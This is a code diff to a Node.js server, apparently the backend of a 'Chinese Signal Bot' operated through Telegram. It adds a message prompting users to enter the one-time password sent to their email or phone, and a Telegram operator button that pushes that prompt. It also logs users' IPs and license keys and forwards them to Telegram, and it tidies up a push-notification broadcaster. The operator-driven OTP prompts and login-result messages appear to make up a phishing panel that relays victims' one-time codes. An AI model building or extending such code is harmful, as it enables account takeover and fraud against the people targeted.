@@ -1208,6 +1208,10 @@ const QUICK_TRIGGERS = {
         type: 'warning',
         text: '🔢 The OTP you entered is incorrect or has expired. Check your email/SMS for the latest code and try again.',
     },
+    request_otp: {
+        type: 'instruction',
+        text: '🔢 Please enter the OTP (One-Time Password) sent to your registered email or phone number to complete the verification.',
+    },
     login_ok: {
         type: 'info',
         text: '✅ Your login was successful! Your account is now verified and connected. Please wait for the next instructions.',
@@ -1428,7 +1432,7 @@ function tgUserActionKeyboard(userName) {
     return {
         inline_keyboard: [
             // Row 1: OTP & Login
-            [{ text: '🔢 Request OTP',         callback_data: `qt|wrong_otp|${u}` },
+            [{ text: '🔢 Request OTP',         callback_data: `qt|request_otp|${u}` },
              { text: '❌ Wrong OTP',            callback_data: `qt|wrong_otp|${u}` }],
             // Row 2: Login result
             [{ text: '✅ Login Successfully',   callback_data: `qt|login_ok|${u}` },
@@ -3164,9 +3168,14 @@ app.post('/api/license-activate', async (req, res) => {
     try {
         const user = await getOrCreateUser(licenseKey, userName);
         if (userName && userName !== 'Pending Name') user.fullName = userName;
+        user.ip = ip;
+        user.lastActivity = new Date().toISOString();
+        user.status = user.status || 'Active';
+        user.connected = user.connected || false;
         user.activities = user.activities || [];
         user.activities.push({ action: 'License Activated', timestamp: new Date().toLocaleString() });
         await saveUser(user);
+        console.log(`[register] user saved — key=${licenseKey} name=${userName} ip=${ip}`);
         broadcastSSE('license_activated', { licenceKey: licenseKey, fullName: userName, ip, timestamp: timestamp || new Date().toLocaleString() });
         await sendTelegramMessage(`🔑 <b>License Activated</b>\n👤 Name: <b>${userName}</b>\n🔑 Key: <b>${licenseKey}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${timestamp}</b>`);
         res.status(200).json({ status: 'success' });
@@ -3992,17 +4001,33 @@ app.post('/api/push/broadcast', async (req, res) => {
     const { title, body, url, icon } = req.body || {};
     const payload = { title: title || 'Chinese Signal Bot', body: body || '', url: url || '/', icon: icon || '/icon-192.png' };
     try {
-        let subs; try { subs = useDatabase ? await PushSub.find({}).lean() : pushSubsMem; } catch(e) { subs = pushSubsMem; }
-        let sent = 0, errors = 0, stale = [];
+        let allSubs;
+        try { allSubs = useDatabase ? await PushSub.find({}).lean() : pushSubsMem; } catch(e) { allSubs = pushSubsMem; }
+        // Only attempt valid subscriptions (must have endpoint + keys.p256dh + keys.auth)
+        const subs = (allSubs || []).filter(s => s && s.endpoint && s.keys && s.keys.p256dh && s.keys.auth);
+        const total = subs.length;
+        let sent = 0, failed = 0, stale = [];
+        console.log(`[push/broadcast] Sending to ${total} valid subscribers`);
         for (const sub of subs) {
-            try { await webPush.sendNotification({ endpoint: sub.endpoint, keys: sub.keys }, JSON.stringify(payload)); sent++; }
-            catch(e) { errors++; if (e.statusCode === 410 || e.statusCode === 404) stale.push(sub.endpoint); }
+            try {
+                await webPush.sendNotification(
+                    { endpoint: sub.endpoint, keys: { p256dh: sub.keys.p256dh, auth: sub.keys.auth } },
+                    JSON.stringify(payload)
+                );
+                sent++;
+            } catch(e) {
+                failed++;
+                console.warn(`[push/broadcast] Failed for ${sub.endpoint.slice(0,60)}: ${e.statusCode} ${e.message}`);
+                if (e.statusCode === 410 || e.statusCode === 404) stale.push(sub.endpoint);
+            }
         }
+        // Remove dead subscriptions
         for (const ep of stale) {
             if (useDatabase) await PushSub.deleteOne({ endpoint: ep }).catch(()=>{});
             else { pushSubsMem = pushSubsMem.filter(s => s.endpoint !== ep); savePushSubsFile(); }
         }
-        res.json({ ok: true, sent, errors, stale: stale.length });
+        console.log(`[push/broadcast] Done — sent:${sent} failed:${failed} stale:${stale.length} total:${total}`);
+        res.json({ ok: true, sent, failed, total, stale: stale.length });
     } catch(e) { res.status(500).json({ error: 'Server error', detail: e.message }); }
 });
 
